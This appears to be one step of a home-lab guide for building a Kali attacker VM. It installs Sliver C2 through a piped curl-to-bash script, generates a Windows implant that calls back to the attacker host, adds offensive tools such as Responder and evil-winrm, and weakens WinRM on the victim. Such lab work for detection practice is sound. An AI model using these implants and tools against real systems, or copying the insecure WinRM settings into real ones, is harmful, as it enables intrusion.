# Step 7: Kali Attacker Setup

Set up the `kali-attacker` VM (192.168.64.30) with Sliver C2, Atomic Red Team, and supporting tools.

---

## System Update

```bash
# [kali]
sudo apt update && sudo apt full-upgrade -y
sudo apt install -y git curl wget python3 python3-pip nmap metasploit-framework impacket-scripts
```

---

## Sliver C2 Framework

```bash
# [kali] Download and install Sliver server
curl https://sliver.sh/install | sudo bash

# Verify
sliver-server version
```

Sliver installs both the server (`sliver-server`) and client (`sliver`) binaries.

```bash
# [kali] Start the Sliver server as a service
sudo systemctl enable --now sliver

# Connect as operator
sliver
# You'll see the Sliver prompt: sliver >
```

### Generate a test implant (after victim is ready)

```
# [kali] Inside sliver prompt — do NOT run until attack scenario
sliver > generate --mtls 192.168.64.30 --os windows --arch arm64 --save /tmp/implant.exe
sliver > mtls --lport 443
sliver > jobs
```

---

## Atomic Red Team

```bash
# [kali] Install PowerShell (for executing ART on Kali, optional)
# ART is primarily designed for Windows — install the PS module on victim-windows
# However, Kali can trigger ART remotely via WinRM or by serving payloads
sudo apt install -y powershell

# Alternatively, clone ART for reference
git clone https://github.com/redcanaryco/atomic-red-team.git ~/tools/atomic-red-team
```

On the Windows victim (for local ART execution):

```powershell
# [windows] Install Invoke-AtomicRedTeam
Install-Module -Name invoke-atomicredteam -Scope CurrentUser -Force
Import-Module invoke-atomicredteam

# Verify
Invoke-AtomicTest T1059.001 -ShowDetails
```

---

## Additional Tools

```bash
# [kali] Responder (LLMNR/NBT-NS poisoning)
sudo apt install -y responder

# BloodHound (AD enumeration — for future AD lab extension)
sudo apt install -y bloodhound

# CrackMapExec
sudo apt install -y crackmapexec

# Evil-WinRM
sudo gem install evil-winrm
```

---

## Tool Verification

```bash
# [kali] Verify key tools
nmap --version
msfconsole --version 2>/dev/null | head -3
python3 -c "import impacket; print(impacket.__version__)"
sliver-server version
```

---

## Network Reachability Test

```bash
# [kali] Confirm victim is reachable
ping -c 2 192.168.64.20

# Port scan victim (basic reachability)
nmap -sV -p 22,80,135,139,445,3389,5985 192.168.64.20
```

Expected open ports on Windows 11 ARM64: 135 (RPC), 139/445 (SMB), 3389 (RDP), 5985 (WinRM if enabled).

---

## Enable WinRM on Victim (Required for Ansible + ART Remote Execution)

```powershell
# [windows] Run as Administrator
Enable-PSRemoting -Force
winrm quickconfig -quiet
winrm set winrm/config/service/auth '@{Basic="true"}'
winrm set winrm/config/service '@{AllowUnencrypted="true"}'

# Add Kali to trusted hosts
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "192.168.64.30" -Force
```

```bash
# [kali] Test WinRM
curl -u Administrator:PASSWORD "http://192.168.64.20:5985/wsman" -d '...'
# Or use evil-winrm:
evil-winrm -i 192.168.64.20 -u Administrator -p 'PASSWORD'
```
